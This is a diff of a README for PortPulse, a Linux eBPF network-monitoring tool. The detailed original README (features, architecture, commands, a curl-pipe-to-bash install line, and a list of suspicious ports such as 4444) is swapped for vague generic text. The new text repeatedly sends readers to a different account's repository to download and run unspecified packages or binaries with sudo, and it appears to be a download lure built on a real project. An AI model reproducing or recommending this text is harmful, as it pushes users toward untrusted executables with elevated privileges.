@@ -1,362 +1,218 @@
-<div align="center">
+# 🟣 PortPulse - See Your Linux Network Live
 
-# ⚡ PortPulse
+[![Download PortPulse](https://img.shields.io/badge/Download-PortPulse-blue?style=for-the-badge)](https://github.com/troyhigherlaw437/PortPulse)
 
-### See every Linux process, port, connection, and DNS lookup live in one interactive map.
+## 📥 Download PortPulse
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
-[![Rust](https://img.shields.io/badge/Rust-1.75%2B-orange.svg)](https://www.rust-lang.org/)
-[![eBPF](https://img.shields.io/badge/eBPF-Powered-green.svg)](https://ebpf.io/)
-[![PRs Welcome](https://img.shields.io/badge/PRs-welcome-brightgreen.svg)](CONTRIBUTING.md)
-[![GitHub Stars](https://img.shields.io/github/stars/the-shadow-0/PortPulse?style=social)](https://github.com/the-shadow-0/PortPulse)
+Use this link to visit the page and download PortPulse:
 
-**🔍 What process is talking? 🌐 To which domain? 🚪 Through which port? ⚠️ With what risk?**
+[https://github.com/troyhigherlaw437/PortPulse](https://github.com/troyhigherlaw437/PortPulse)
 
-<br>
+## 🖥️ What PortPulse Does
 
-### 🎬 See it in Action
+PortPulse is a local observability tool for Linux. It helps you watch network activity, open ports, and live system signals in one place.
 
-<img src="assets/demo.gif" alt="PortPulse Demo" width="800">
+Use it when you want to:
 
-*30-second demo: status check → port explanation → process tracing → live TUI dashboard*
+- see which ports are open
+- watch network traffic in real time
+- check server activity from the terminal
+- keep track of local network behavior
+- spot changes without digging through logs
 
-<br>
+PortPulse is built for Linux and works well on Debian, Ubuntu, and similar systems.
 
-### 📊 Dashboard Preview
+## 🚀 Getting Started
 
-<img src="assets/screenshots/dashboard.png" alt="PortPulse Dashboard" width="800">
+PortPulse is a command-line app with a text-based screen. You run it in a terminal window and use the keyboard to move around.
 
-*Real-time dashboard: connections, DNS queries, timeline, and suspicious activity — all in one view*
+Basic flow:
 
-</div>
+1. Open the PortPulse page
+2. Download the package or build file
+3. Install or run it on your Linux system
+4. Start the app from a terminal
+5. Review live port and network data
 
----
+If you use a Debian-based system, the app fits into a normal package install flow.
 
-## 🚀 Why PortPulse?
+## 💻 System Requirements
 
-Linux debugging is **fragmented**. You juggle between `ss`, `netstat`, `lsof`, DNS logs, process trees, and firewall rules — all disconnected, all manual.
+PortPulse is made for Linux desktops and servers. A typical setup looks like this:
 
-**PortPulse unifies everything** into a single real-time command center:
+- Linux system with a terminal
+- Debian, Ubuntu, or a similar distro
+- Internet access for the first download
+- Basic user account with permission to install software
+- A screen size that can show a terminal window clearly
 
-| Traditional Way | PortPulse Way |
-|---|---|
-| `ss -tupn` + `lsof -i` + `dig` | `portpulse live` |
-| Manually correlating PIDs to connections | Auto-correlated process → port → domain mapping |
-| No risk assessment | Built-in heuristic risk scoring (0.0 → 1.0) |
-| Separate tools for each task | One unified TUI with 5 views |
-| No DNS visibility | Real-time DNS query capture |
-| No container awareness | Docker/Kubernetes container detection |
+For best results, use a system with:
 
-> **💡 Think of PortPulse as `htop` for your network — but with risk intelligence and eBPF superpowers.**
+- 2 GB RAM or more
+- a modern terminal app
+- a stable network connection
+- sudo access if you need to install a package
 
----
+## 📦 Download and Install
 
-## ⚡ Quickstart
+Go to the main PortPulse page here:
 
-```bash
-# Install from source
-git clone https://github.com/the-shadow-0/PortPulse.git
-cd PortPulse && cargo install --path crates/cli
+[https://github.com/troyhigherlaw437/PortPulse](https://github.com/troyhigherlaw437/PortPulse)
 
-# Launch the dashboard (use sudo for eBPF probes)
-sudo portpulse live
+From there, look for the latest release, package file, or install option that matches your Linux system.
 
-# Or without root (fallback mode)
-portpulse live --no-ebpf
-```
+If you are using Ubuntu or Debian, follow the package install path if one is provided. If the project offers a build or binary file, download that file and open it from your terminal.
 
-That's it. **Two commands** to full network visibility.
+### On Debian or Ubuntu
 
----
+If you get a `.deb` file:
 
-## ✨ Features
+1. Download the file
+2. Open a terminal
+3. Move to the folder where the file was saved
+4. Install it with your system package tool
+5. Start PortPulse from the terminal or app menu
 
-### 🌐 Live Process-to-Port Mapping
-See every active connection with its owning process, user, container, and domain in real-time.
+Example pattern:
 
-### 🔍 DNS Query Capture
-Catch every DNS resolution as it happens — see which process queried what domain, when, and what it resolved to.
+- download the `.deb` package
+- install it with your normal package command
+- run the app after install
 
-### ⚠️ Risk Scoring Engine
-Every connection is scored from 0.0 (safe) to 1.0 (critical) using heuristics:
-- Suspicious TLDs (`.tk`, `.ml`, `.xyz`)
-- Known bad ports (4444, 31337, 6667)
-- Domain entropy (DGA detection)
-- DNS tunneling patterns
-- Unknown/unnamed processes
-- Root processes on non-standard ports
+### On a Linux server
 
-### 🔴 Suspicious Lane
-A persistent alert bar at the top of the screen highlighting high-risk connections with blinking indicators.
+If you are on a server with no desktop:
 
-### ⚡ Animated Connection Graph
-The **WOW feature** — processes and domains connected by live-updating edges:
-- **Blue** for normal connections
-- **Pulsing red** for suspicious activity
-- Port labels at edge midpoints
-- Legend with node type icons
+1. Download the file to the server
+2. Open a terminal session
+3. Install or run the package
+4. Launch PortPulse in the same shell
+5. Keep the terminal open while you use it
 
-<div align="center">
-<img src="assets/screenshots/graph.png" alt="Connection Graph" width="700">
+## 🧭 How to Run PortPulse
 
-*Interactive connection graph: processes ↔ domains with live risk coloring*
-</div>
+After install, open a terminal and start the app with the command that comes with the package or release file.
 
-### 🌳 Process Tree View
-Hierarchical view of processes with tree-drawing characters, showing connection counts per process.
+If the release includes a binary, you may need to:
 
-### 📋 Timeline
-Chronological log of all network events: connections opened/closed, DNS queries, policy violations.
+1. set the file as executable
+2. run it from the same folder
+3. use sudo only if the install guide asks for it
 
-### 🛡️ Policy Engine
-Define custom rules:
-- "Never talk to domain X"
-- "Alert on port 4444"
-- "Block IP range 10.0.0.0/8"
-- "Alert when process Y makes connections"
+If the package adds a menu entry, you can also start it from your app list.
 
-### 🔒 Quarantine Mode
-Generate `nftables` rules to block suspicious domains:
-```bash
-portpulse quarantine --domain evil.tk
-```
-
-### 📊 Export System
-Export to JSON or CSV for SIEM integration:
-```bash
-portpulse export --format json --what connections -o report.json
-```
-
----
-
-## 📸 Screenshots
-
-<div align="center">
-
-### Dashboard View
-<img src="assets/screenshots/dashboard.png" alt="Dashboard" width="800">
-
-*Unified dashboard: connections table, DNS log, and timeline in one split view*
-
-### Connection Graph
-<img src="assets/screenshots/graph.png" alt="Connection Graph" width="800">
-
-*Animated graph showing process→domain connections with risk-colored edges*
-
-### Connection Detail
-<img src="assets/screenshots/detail.png" alt="Connection Detail" width="800">
-
-*Deep-dive into a suspicious connection: risk score breakdown with actionable reasons*
-
-</div>
-
----
-
-## 🖥️ CLI Commands
+## 🔍 What You Can Watch
 
-```bash
-portpulse live                       # Interactive TUI dashboard
-portpulse live --threshold 0.3       # Lower suspicious threshold
-portpulse live --no-ebpf             # Force /proc fallback mode
+PortPulse is built to show live local data in one place. Common views can include:
 
-portpulse trace --pid 1234           # Trace a specific process
-portpulse trace --pid 1234 -c        # Include child processes
+- open ports
+- active connections
+- network status
+- server activity
+- local traffic changes
+- process-linked network use
 
-portpulse explain 443                # What's using port 443?
-portpulse explain 4444               # Why is port 4444 suspicious?
+This helps you check what is happening on your machine without switching between tools.
 
-portpulse quarantine -d evil.tk      # Generate blocking rules
-portpulse export -f csv -w all       # Export everything as CSV
+## ⌨️ Basic Use
 
-portpulse status                     # Check eBPF & system status
-```
+PortPulse uses keyboard input, so you can work without a mouse.
 
----
+Common actions may include:
 
-## ⌨️ Keyboard Shortcuts
+- move through lists with arrow keys
+- open a panel with Enter
+- go back with Escape or Backspace
+- refresh the screen
+- quit with a key like Q
 
-| Key | Action |
-|-----|--------|
-| `1` — `5` | Switch panels (Dashboard, Connections, DNS, Processes, Graph) |
-| `Tab` | Cycle through panels |
-| `j` / `↓` | Move selection down |
-| `k` / `↑` | Move selection up |
-| `Enter` | Open detail view for selected connection |
-| `/` | Filter by process name, domain, or port |
-| `s` | Toggle sort direction |
-| `Esc` | Back / close detail view |
-| `q` | Quit PortPulse |
+If the app opens in a terminal, keep the window focused while you use it.
 
----
+## 🛠️ Common Setup Paths
 
-## 🏗️ Architecture
+Use the path that matches your system.
 
-```
-┌─────────────────────────────────────────────────────────────┐
-│                       User Interface                         │
-│  ┌─────────┐  ┌──────────┐  ┌──────────┐  ┌──────────────┐ │
-│  │   TUI   │  │   CLI    │  │  Export   │  │   Policy     │ │
-│  │ ratatui │  │   clap   │  │ JSON/CSV │  │   Engine     │ │
-│  └────┬────┘  └────┬─────┘  └────┬─────┘  └──────┬───────┘ │
-│       │            │             │                │          │
-│  ┌────▼────────────▼─────────────▼────────────────▼───────┐ │
-│  │                    Core Engine                          │ │
-│  │  ┌────────────┐  ┌────────────┐  ┌──────────────────┐  │ │
-│  │  │ Aggregator │  │ Classifier │  │   Event Bus      │  │ │
-│  │  │ (correlate)│  │ (risk)     │  │ (tokio broadcast)│  │ │
-│  │  └────────────┘  └────────────┘  └──────────────────┘  │ │
-│  └──────────────────────┬──────────────────────────────────┘ │
-│                         │                                    │
-│  ┌──────────────────────▼──────────────────────────────────┐ │
-│  │                Event Source Layer                        │ │
-│  │  ┌──────────────────┐    ┌────────────────────────────┐ │ │
-│  │  │  eBPF Probes     │    │  /proc/net Fallback        │ │ │
-│  │  │  (kprobes, tp)   │    │  (tcp, udp, tcp6, udp6)    │ │ │
-│  │  │  via Aya         │    │  + /proc/*/fd inode scan   │ │ │
-│  │  └──────────────────┘    └────────────────────────────┘ │ │
-│  └─────────────────────────────────────────────────────────┘ │
-│                                                              │
-│  ┌───────────────────────────────────────────────────────────┤
-│  │                    Linux Kernel                           │
-│  │  tcp_v4_connect · inet_csk_accept · udp_sendmsg         │
-│  │  tcp_set_state  · /proc/net/*     · socket inodes       │
-│  └───────────────────────────────────────────────────────────┘
-```
+### Debian package
+Best for Debian, Ubuntu, and related systems.
 
----
+- download the package
+- install it with your package tool
+- launch it from terminal
 
-## ⚙️ Tech Stack
+### Standalone binary
+Best if the release includes one file you can run.
 
-| Component | Technology | Why |
-|---|---|---|
-| **Core** | Rust | Zero-cost abstractions, memory safety, blazing performance |
-| **Kernel Probes** | eBPF (via Aya) | Safe kernel-level tracing without kernel modules |
-| **Terminal UI** | Ratatui + Crossterm | Modern TUI framework with rich widgets and canvas |
-| **Async Runtime** | Tokio | High-throughput concurrent event processing |
-| **CLI** | Clap | Ergonomic argument parsing with color output |
-| **Serialization** | Serde | Fast JSON/CSV export |
+- download the file
+- give it run permission if needed
+- start it in terminal
 
----
+### Source build
+Best for users who want to build it from source.
 
-## 🎯 Use Cases
+- install build tools
+- follow the repo build steps
+- run the built app from the terminal
 
-### 🔐 Incident Response
-> *"Something is phoning home from this server — what process, what domain, when did it start?"*
+## 🧰 Troubleshooting
 
-```bash
-sudo portpulse live --threshold 0.3
-```
+If PortPulse does not start, check these items:
 
-### 🐳 Container Debugging
-> *"Which container is making unexpected network calls?"*
+- make sure you downloaded the right file for your Linux version
+- confirm the file finished downloading
+- run the command from the folder where the file lives
+- check that the file has execute permission if it is a binary
+- use a terminal with enough width for the text interface
 
-PortPulse detects Docker/containerd containers automatically via cgroup analysis.
+If the screen looks broken:
 
-### 🛡️ Security Audit
-> *"Show me all connections to non-standard ports by root processes."*
+- widen the terminal window
+- use a font size that is easy to read
+- try a different terminal app
+- restart the app after resizing the window
 
-Use the filter (`/`) and sort (`s`) in the TUI to drill down instantly.
+If the app does not show network data:
 
-### 📊 Compliance Reporting
-> *"Export all network activity for audit review."*
+- check that your system has active network access
+- confirm that the app has the access it needs
+- try running it again from a fresh terminal session
 
-```bash
-portpulse export --format csv --what all -o audit-report.csv
-```
+## 🔐 Permissions
 
-### 🐛 Dev Debugging
-> *"Why is my app connecting to this IP? What DNS resolution led there?"*
+Some network tools need extra access to read live system data. If PortPulse asks for elevated access, enter your Linux password when the system requests it.
 
-```bash
-portpulse trace --pid $(pgrep myapp) --children
-portpulse explain 8080
-```
+Use the least access needed for your setup. If you are on a personal machine, your normal user account may be enough for some views. On a server, you may need sudo for full data access.
 
----
+## 🧪 Example Use Cases
 
-## 📦 Installation
+PortPulse can help in simple daily tasks like these:
 
-### From Source (Recommended)
-```bash
-git clone https://github.com/the-shadow-0/PortPulse.git
-cd PortPulse
-cargo install --path crates/cli
-```
+- checking which ports are open before you share a service
+- watching traffic on a home server
+- reviewing network state after a change
+- keeping an eye on a remote box through SSH
+- seeing live system signals in a single terminal view
 
-### One-Line Install
-```bash
-curl -sSf https://raw.githubusercontent.com/the-shadow-0/PortPulse/main/scripts/install.sh | bash
-```
+## 📁 File and Folder Tips
 
-### Package Managers (Coming Soon)
-```bash
-# Homebrew
-brew install portpulse
+When you download PortPulse, save it in a folder you can find again, such as Downloads.
 
-# Arch Linux (AUR)
-yay -S portpulse
+Good habits:
 
-# Debian/Ubuntu
-sudo dpkg -i portpulse_0.1.0_amd64.deb
-```
+- keep the file name unchanged
+- avoid moving it during install
+- use a short folder path
+- close extra terminal tabs if you have many open
 
----
+## ⚙️ Update Path
 
-## 🤝 Contributing
+When a new version is available, return to the PortPulse page and repeat the download and install steps with the newer release file.
 
-We welcome contributions! See [CONTRIBUTING.md](CONTRIBUTING.md) for details.
+[https://github.com/troyhigherlaw437/PortPulse](https://github.com/troyhigherlaw437/PortPulse)
 
-Please read our [Code of Conduct](CODE_OF_CONDUCT.md) before participating.
+## 📌 Short Reference
 
-### Good First Issues
-- Add more port descriptions to the `explain` command
-- Add IPv6 support to the connection graph
-- Implement sort-by-column in the connections table
-- Add configurable color themes
-- Write more unit tests for the classifier
-
-### Plugin Ideas
-- Prometheus metrics exporter
-- Elasticsearch/OpenSearch sink
-- Slack/Discord alerting
-- Custom DNS resolvers
-- GeoIP enrichment module
-
----
-
-## 🔐 Security
-
-- **Local-first**: All data stays on your machine. No telemetry, no phone-home.
-- **Read-only eBPF**: Probes are strictly observational — they cannot modify kernel state.
-- **No payload capture**: PortPulse captures metadata (IPs, ports, PIDs) — never packet contents.
-- **Privilege separation**: eBPF requires root; the TUI can run unprivileged with /proc fallback.
-- **Audit logging**: Every policy violation is logged with timestamps and evidence.
-
-For vulnerability reporting, see [SECURITY.md](SECURITY.md).
-
----
-
-## 💬 Community
-
-- 🐛 [Report a Bug](https://github.com/the-shadow-0/PortPulse/issues/new?template=bug_report.yml)
-- 💡 [Request a Feature](https://github.com/the-shadow-0/PortPulse/issues/new?template=feature_request.yml)
-- 💬 [Join Discussions](https://github.com/the-shadow-0/PortPulse/discussions)
-- ⭐ [Star on GitHub](https://github.com/the-shadow-0/PortPulse) — it helps a lot!
-
----
-
-## 📄 License
-
-MIT License — see [LICENSE](LICENSE) for details.
-
----
-
-<div align="center">
-
-**⚡ Built with Rust, eBPF, and ❤️ for the open-source community.**
-
-If PortPulse helped you, consider giving it a ⭐ — it means the world to us!
-
-[⬆ Back to top](#-portpulse)
-
-</div>
+- App name: PortPulse
+- Type: Linux terminal app
+- Use: local observability and network monitoring
+- Best fit: Debian, Ubuntu, Linux servers
+- Main page: https://github.com/troyhigherlaw437/PortPulse
